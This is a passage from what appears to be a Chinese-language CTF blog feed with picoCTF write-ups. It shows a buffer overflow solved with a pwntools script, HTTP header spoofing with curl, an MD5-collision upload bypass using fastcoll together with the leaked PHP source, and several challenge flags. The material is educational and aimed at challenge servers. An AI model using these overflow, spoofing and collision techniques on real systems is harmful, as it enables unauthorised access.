keyword">void</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>input<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> buf2<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">strcpy</span><span class="token punctuation">(</span>buf2<span class="token punctuation">,</span> input<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>使用pwntools 送值</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"saturn.picoctf.net"</span><span class="token punctuation">,</span><span class="token number">55984</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token number">100</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'payload:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'flag:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>flag:</code>picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> picoCTF </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>picoCTF Who are you? [100 points]</title>
      <link href="/CTF/picoCTF/Web%20Exploitation/Who%20are%20you/posts/"/>
      <url>/CTF/picoCTF/Web%20Exploitation/Who%20are%20you/posts/</url>
      
        <content type="html"><![CDATA[<h1 id="Who-are-you"><a href="#Who-are-you" class="headerlink" title="Who are you?"></a>Who are you?</h1><p>points:100</p><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote><p>Let me in. Let me iiiiiiinnnnnnnnnnnnnnnnnnnn <a href="http://mercury.picoctf.net:38322/">http://mercury.picoctf.net:38322/</a></p></blockquote><h2 id="Hints"><a href="#Hints" class="headerlink" title="Hints"></a>Hints</h2><blockquote><p>It ain’t much, but it’s an RFC <a href="https://tools.ietf.org/html/rfc2616">https://tools.ietf.org/html/rfc2616</a></p></blockquote><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>一開始可以看到網頁有個提示：use PicoBrowser<br><img src="https://i.imgur.com/Fo1yJgi.png" alt="Image"></p><h3 id="User-Agent-PicoBrowser"><a href="#User-Agent-PicoBrowser" class="headerlink" title="User-Agent: PicoBrowser"></a>User-Agent: PicoBrowser</h3><blockquote><p>I don’t trust users visiting from another site.</p></blockquote><h3 id="Referer-http-mercury-picoctf-net-38322"><a href="#Referer-http-mercury-picoctf-net-38322" class="headerlink" title="Referer: http://mercury.picoctf.net:38322/"></a>Referer: <a href="http://mercury.picoctf.net:38322/">http://mercury.picoctf.net:38322/</a></h3><blockquote><p>Sorry, this site only worked in 2018.</p></blockquote><h3 id="Date-2018"><a href="#Date-2018" class="headerlink" title="Date: 2018"></a>Date: 2018</h3><blockquote><p>I don’t trust users who can be tracked.</p></blockquote><h3 id="DNT-1"><a href="#DNT-1" class="headerlink" title="DNT: 1"></a>DNT: 1</h3><blockquote><p>This website is only for people from Sweden.</p></blockquote><h3 id="X-Forwarded-For-2-16-66-0"><a href="#X-Forwarded-For-2-16-66-0" class="headerlink" title="X-Forwarded-For: 2.16.66.0"></a>X-Forwarded-For: 2.16.66.0</h3><blockquote><p>You’re in Sweden but you don’t speak Swedish?</p></blockquote><h3 id="Accept-Language-sv"><a href="#Accept-Language-sv" class="headerlink" title="Accept-Language: sv"></a>Accept-Language: sv</h3><blockquote><p>What can I say except, you are welcome</p></blockquote><p>使用curl更改配送後送出得到flag</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token string">'http://mercury.picoctf.net:38322/'</span> <span class="token punctuation">\</span><span class="token parameter variable">--header</span> <span class="token string">'User-Agent: PicoBrowser'</span> <span class="token punctuation">\</span><span class="token parameter variable">--header</span> <span class="token string">'Referer: http://mercury.picoctf.net:38322/'</span> <span class="token punctuation">\</span><span class="token parameter variable">--header</span> <span class="token string">'Date: 2018'</span> <span class="token punctuation">\</span><span class="token parameter variable">--header</span> <span class="token string">'DNT: 1'</span> <span class="token punctuation">\</span><span class="token parameter variable">--header</span> <span class="token string">'X-Forwarded-For: 2.16.66.0'</span> <span class="token punctuation">\</span><span class="token parameter variable">--header</span> <span class="token string">'Accept-Language: sv'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag: picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_b22d773c}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> picoCTF </tag>
            
            <tag> Web Exploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>picoCTF It is my Birthday [100 points]</title>
      <link href="/CTF/picoCTF/Web%20Exploitation/It%20is%20my%20Birthday/posts/"/>
      <url>/CTF/picoCTF/Web%20Exploitation/It%20is%20my%20Birthday/posts/</url>
      
        <content type="html"><![CDATA[<h1 id="It-is-my-Birthday"><a href="#It-is-my-Birthday" class="headerlink" title="It is my Birthday"></a>It is my Birthday</h1><p>points:100</p><h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><blockquote><p>I sent out 2 invitations to all of my friends for my birthday! I’ll know if they get stolen because the two invites look similar, and they even have the same md5 hash, but they are slightly different! You wouldn’t believe how long it took me to find a collision. Anyway, see if you’re invited by submitting 2 PDFs to my website. <a href="http://mercury.picoctf.net:50970/">http://mercury.picoctf.net:50970/</a></p></blockquote><h1 id="Hint"><a href="#Hint" class="headerlink" title="Hint"></a>Hint</h1><blockquote><p>Look at the category of this problem.<br>How may a PHP site check the rules in the description?</p></blockquote><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>一進來網頁後看到可以上傳檔案，根據題目的提示似乎要檢查上傳pdf檔且md5值要一致<br><img src="https://i.imgur.com/2z0vgIQ.png" alt="Image"></p><blockquote><p>思路：自己產出一個兩個不同的字串但有相同的 PREFIX 和相同的 md5 值的檔案且副檔名要為pdf</p></blockquote><p>首先先安裝fastcoll這個工具</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libboost-filesystem-dev libboost-program-options-dev <span class="token function">git</span> clone https://github.com/brimstone/fastcoll.git<span class="token builtin class-name">cd</span> fastcloneg++ <span class="token parameter variable">-O3</span> *.cpp <span class="token parameter variable">-lboost_filesystem</span> <span class="token parameter variable">-lboost_program_options</span> <span class="token parameter variable">-lboost_system</span> <span class="token parameter variable">-o</span> fastcoll <span class="token parameter variable">-static</span> <span class="token operator">&amp;&amp;</span> strip fastcoll<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>執行完後會在當前目錄產生fastoll執行檔，之後創建任意一個檔案當作prefix標準</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">touch</span> ntust<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用指令產出兩個pdf檔案(兩個不同的字串但有相同的 PREFIX 和相同的 md5 值的檔案)</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./fastcoll <span class="token parameter variable">-p</span> ntust <span class="token parameter variable">-o</span> <span class="token punctuation">..</span>/1.pdf <span class="token punctuation">..</span>/2.pdf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>把檔案丟上去並送出，拿到此php source code</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"submit"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$type1</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file1"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$type2</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file2"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$size1</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file1"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$size2</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file2"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$SIZE_LIMIT</span> <span class="token operator">=</span> <span class="token number">18</span> <span class="token operator">*</span> <span class="token number">1024</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$size1</span> <span class="token operator">&lt;</span> <span class="token variable">$SIZE_LIMIT</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$size2</span> <span class="token operator">&lt;</span> <span class="token variable">$SIZE_LIMIT</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$type1</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"application/pdf"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$type2</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"application/pdf"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$contents1</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file1"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$contents2</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file2"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$contents1</span> <span class="token operator">!=</span> <span class="token variable">$contents2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file1"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file2"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"MD5 hashes do not match!"</span><span class="token punctuation">;</span>                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Files are not different!"</span><span class="token punctuation">;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Not a PDF!"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"File too large!"</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// FLAG: picoCTF&#123;c0ngr4ts_u_r_1nv1t3d_73b0c8ad&#125;</span><span class="token delimiter important">?></span></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>It is my Birthday<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text-muted<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>It is my Birthday<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>jumbotron<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lead<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>row<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>col-xs-12 col-sm-12 col-md-12<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">></span></span>See if you are invited to my party!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload-form<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">role</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>row<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form-group<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file1<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file1<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form-control input-lg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file2<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file2<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form-control input-lg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>row<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>col-xs-12 col-sm-12 col-md-12<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-lg btn-success btn-block<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Upload<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>footer</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>footer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&copy;">&amp;copy;</span> PicoCTF<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>footer</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">$</span><span class="token punctuation">(</span>document<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ready</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".close"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"myAlert"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"close"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>flag: picoCTF{c0ngr4ts_u_r_1nv1t3d_73b0c8ad}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> picoCTF </tag>
            
            <tag> Web Exploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>picoCTF vault-door-training [50 points]</title>
      <link href="/CTF/picoCTF/Reverse%20Engineering/vault-door-training/vault-door-training/"/>
      <url>/CTF/picoCTF/Reverse%20Engineering/vault-door-training/vault-door-training/</url>
      
        <content type="html"><![CDATA[<h1 id="vault-door-training"><a href="#vault-door-training" class="headerlink" title="vault-door-training"></a>vault-door-training</h1><p>Points:50</p><h1 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h1><blockquote><p>Your mission is to enter Dr. Evil’s laboratory and retrieve the blueprints for his Doomsday Project. The laboratory is protected by a series of locked vault doors. Each door is controlled by a computer and requires a password to open. Unfortunately, our undercover agents have not been able to obtain the secret passwords for the vault doors, but one of our junior agents obtained the source code for each vault’s computer! You will need to read the source code for each level to figure out what the password is for that vault door. As a warmup, we have created a replica vault in our training facility. The source code for the training vault is here: VaultDoorTraining.java</p></blockquote><h2 id="Hint"><a href="#Hint" class="headerlink" title="Hint"></a>Hint</h2><blockquote><p>The password is revealed in the program’s source code.</p></blockquote><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>打開source code，發現此function</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">checkPassword</span><span class="token punctuation">(</span><span class="token class-name">String</span> password<span class="token 